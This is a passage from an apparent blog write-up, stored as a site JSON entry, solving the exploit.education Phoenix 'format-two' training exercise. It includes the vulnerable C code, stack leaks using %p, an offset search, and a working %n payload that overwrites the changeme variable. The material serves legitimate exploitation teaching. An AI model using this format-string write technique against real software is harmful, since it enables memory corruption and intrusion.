*str) {   printf(str); }  int main(int argc, char **argv) {   char buf[256];    printf(\"%s\\n\", BANNER);    if (argc &gt; 1) {     memset(buf, 0, sizeof(buf));     strncpy(buf, argv[1], sizeof(buf));     bounce(buf);   }    if (changeme != 0) {     puts(\"Well done, the 'changeme' variable has been changed correctly!\");   } else {     puts(\"Better luck next time!\\n\");   }    exit(0); }   COMMON BADCHARS      \\x00 (Null)   \\x09 (Tab)   \\x0a (New line)   \\x0d (Return)   \\x20 (Space)   So there is no way we could overwrite changeme with a buffer   But in order to pass the program, we have to change the changeme variable   Lets try passing some format strings in it,   user@phoenix-amd64:~$ ./format-two %p%p%p%p%p%p%p%p Welcome to phoenix/format-two, brought to you by https://exploit.education 00xf000x7fffffffe5a00x7fffffffe54f0x7fffffffe5900x7fffffffe5900x7fffffffe690Better luck next time!    So it is popping the values from stack   Lets find the offset where our input comes into stack   user@phoenix-amd64:~$ ./format-two AAAABBBB%p%p%p%p%p%p%p%p%p%p%p%p%p Welcome to phoenix/format-two, brought to you by https://exploit.education AAAABBBB00xe00x7fffffffe5a20x7fffffffe53f0x7fffffffe5800x7fffffffe5800x7fffffffe6800x4007050x7fffffffe6d80x2004003680x42424242414141410x7025702570257025Better luck next time!    So our input comes in the 12th offset 0x4242424241414141   We can also pass this like,   user@phoenix-amd64:~$ ./format-two \"AAAABBBB %p %p %p %p %p %p %p %p %p %p %p %p %p\" Welcome to phoenix/format-two, brought to you by https://exploit.education AAAABBBB 0 0x1 0 0x7fffffffe59f 0x7fffffffe52f 0x7fffffffe570 0x7fffffffe570 0x7fffffffe670 0x400705 0x7fffffffe6c8 0x200400368 0x4242424241414141 0x2520702520702520Better luck next time!    We cannot point the offset directly in our input, it fails like this   user@phoenix-amd64:~$ ./format-two \"AAAA %12$p\" Welcome to phoenix/format-two, brought to you by https://exploit.education Better luck next time!    We have to use our whole buffer space for this   For address of changeme,     0x0000000000400705 &lt;+120&gt;:\tmov    eax,DWORD PTR [rip+0x2003e5]        # 0x600af0 &lt;changeme&gt;   or try listing variables in GDB using  info variables   or try using nm to read symbols,   user@phoenix-amd64:~$ nm format-two  | grep changeme 0000000000600af0 B changeme   Our changeme is at 0x600af0   Lets try to point our 12th offset with this from input,   user@phoenix-amd64:~$ ./format-two $(python -c 'print \"\\xf0\\x0a\\x60\" + \"%p\"*11 + \"%p\"') Welcome to phoenix/format-two, brought to you by https://exploit.education �etter luck next time!   user@phoenix-amd64:~$ ./format-two $(python -c 'print \"\\xf0\\xaa\\x60\" + \"%p\"*11 + \"%p\"') Welcome to phoenix/format-two, brought to you by https://exploit.education �00x500x7fffffffe59b0x7fffffffe53f0x7fffffffe5800x7fffffffe5800x7fffffffe6800x4007050x7fffffffe6d80x2004003680x257025702560aaf0Better luck next time!    But the problem is you cannot pass null bytes and bad chars into input as address (Here \\x0a is a bad char)   So we could not execute it correctly,it leads to segmentation fault or errors   So lets try it on 32 bit,   For address of changeme in 32bit:   (gdb) info variables All defined variables:  Non-debugging symbols: 0x080486c4  __GNU_EH_FRAME_HDR 0x08048724  __EH_FRAME_BEGIN__ 0x0804876c  __FRAME_END__ 0x08049770  __CTOR_LIST__ 0x08049774  __CTOR_END__ 0x08049778  __DTOR_LIST__ 0x0804977c  __DTOR_END__ 0x08049780  _DYNAMIC 0x08049820  _GLOBAL_OFFSET_TABLE_ 0x08049844  __dso_handle 0x08049848  __TMC_END__ 0x08049848  __bss_start 0x08049848  _edata 0x08049848  completed 0x0804984c  dtor_idx 0x08049850  object 0x08049868  changeme 0x0804986c  _end   or   user@phoenix-amd64:/opt/phoenix/i486$ nm format-two  | grep changeme 08049868 B changeme   Address of changeme is at 0x08049868   user@phoenix-amd64:/opt/phoenix/i486$ ./format-two $(python -c 'print \"AAAA\" + \"%p\"*11 + \"%p\"') Welcome to phoenix/format-two, brought to you by https://exploit.education AAAA0xffffd8d00x10000xf7f84b670xffffd7400xffffd7280x80485a00xffffd6200xffffd8d00x1000x3e80x41414141Better luck next time!   Lets try placing the address of changeme in input   user@phoenix-amd64:/opt/phoenix/i486$ ./format-two $(python -c 'print \"\\x68\\x98\\x04\\x08\" + \"%p\"*11 + \"%p\"') Welcome to phoenix/format-two, brought to you by https://exploit.education 0xffffd8d00x10000xf7f84b670xffffd7400xffffd7280x80485a00xffffd6200xffffd8d00x1000x3e80x8049868Better luck next time!   So we could place the address of changeme using format string   Now here comes the important part of the exploit,   We should use %n to perform arbitrary write on the specific address location   %n writes the value of number of charaters written so far into the address   Now if we use %n instead of %p at the 12th offset which has the address of changeme, it tries to perform arbitrary write on changeme and passes the condition of the program   user@phoenix-amd64:/opt/phoenix/i486$ ./format-two $(python -c 'print \"\\x68\\x98\\x04\\x08\" + \"%p\"*11 + \"%n\"') Welcome to phoenix/format-two, brought to you by https://exploit.education 0xffffd8d00x10000xf7f84b670xffffd7400xffffd7280x80485a00xffffd6200xffffd8d00x1000x3e8Well done, the 'changeme' variable has been changed correctly!   We have overwritten the value of changeme successfully using format string arbitrary write   Done! we have completed “format-two”   ","categories": ["Binary Exploitation"],
        "tags": ["format string"],
        "url": "http://localhost:4000/binary%20exploitation/4-format2/",
        "teaser": "http://localhost:4000/assets/images/binary-exploitation/binexp.png"
      }]
